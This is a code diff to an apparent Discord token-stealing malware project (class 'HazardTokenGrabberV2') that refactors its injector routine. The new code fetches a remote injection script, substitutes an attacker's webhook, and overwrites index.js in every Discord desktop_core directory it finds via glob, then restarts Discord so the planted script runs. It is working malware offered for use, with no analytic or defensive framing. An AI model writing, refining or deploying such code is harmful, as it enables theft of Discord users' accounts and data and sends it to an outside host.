@@ -1,5 +1,6 @@
 import asyncio
 import ctypes
+import glob
 import json
 import ntpath
 import os
@@ -256,39 +257,30 @@ class HazardTokenGrabberV2(Functions):
             pass
 
     async def injector(self):
-        # TO DO: reduce cognetive complexity
-        for _dir in os.listdir(self.appdata):
-            if 'discord' in _dir.lower():
-                discord = self.appdata + os.sep + _dir
-                for __dir in os.listdir(ntpath.abspath(discord)):
-                    if re.match(r'app-(\d*\.\d*)*', __dir):
-                        app = ntpath.abspath(ntpath.join(discord, __dir))
-                        modules = ntpath.join(app, 'modules')
-                        if not ntpath.exists(modules):
-                            return
-                        for ___dir in os.listdir(modules):
-                            if re.match(r"discord_desktop_core-\d+", ___dir):
-                                inj_path = modules + os.sep + ___dir + f'\\discord_desktop_core\\'
-                                if ntpath.exists(inj_path):
-                                    if self.startup_loc not in argv[0]:
-                                        try:
-                                            os.makedirs(inj_path + 'initiation', exist_ok=True)
-                                        except PermissionError:
-                                            pass
-                                    if self.hook_reg in self.webhook:
-                                        f = httpx.get(self.fetch_conf('injection_url')).text.replace("%WEBHOOK%", self.webhook)
-                                    else:
-                                        f = httpx.get(
-                                            self.fetch_conf('injection_url')).text.replace(
-                                            "%WEBHOOK%", self.webhook).replace(
-                                            "%WEBHOOK_KEY%", self.fetch_conf('webhook_protector_key'))
-                                    try:
-                                        with open(inj_path + 'index.js', 'w', errors="ignore") as indexFile:
-                                            indexFile.write(f)
-                                    except PermissionError:
-                                        pass
-                                    if self.fetch_conf('kill_processes'):
-                                        os.startfile(app + self.sep + _dir + '.exe')
+        # download and hydrate injection script
+        inj_script = httpx.get(self.fetch_conf('injection_url')).text.replace("%WEBHOOK%", self.webhook)
+        if self.hook_reg not in self.webhook:
+            inj_script = inj_script.replace("%WEBHOOK_KEY%", self.fetch_conf('webhook_protector_key'))
+
+        # scan appdata for potential injection directories
+        possible_targets = glob.glob(f'{self.appdata}/[dD]iscord/*/*/*/discord_desktop_core/')
+        for inj_path in possible_targets:
+            if self.startup_loc not in argv[0]:
+                try:
+                    os.makedirs(inj_path + 'initiation', exist_ok=True)
+                except PermissionError:
+                    pass
+            try:
+                with open(inj_path + 'index.js', 'w', errors="ignore") as indexFile:
+                    indexFile.write(inj_script)
+            except PermissionError:
+                pass
+            # restart Discord if it was killed
+            if self.fetch_conf('kill_processes'):
+                inj_dirs = inj_path.split(self.sep)
+                # [:-4] -> path of app-* directory
+                # [-6] -> discord || Discord
+                os.startfile(self.sep.join(inj_dirs[:-4]) + self.sep + inj_dirs[-6] + '.exe')
 
     async def killProcesses(self):
         blackListedPrograms = self.fetch_conf('blackListedPrograms')
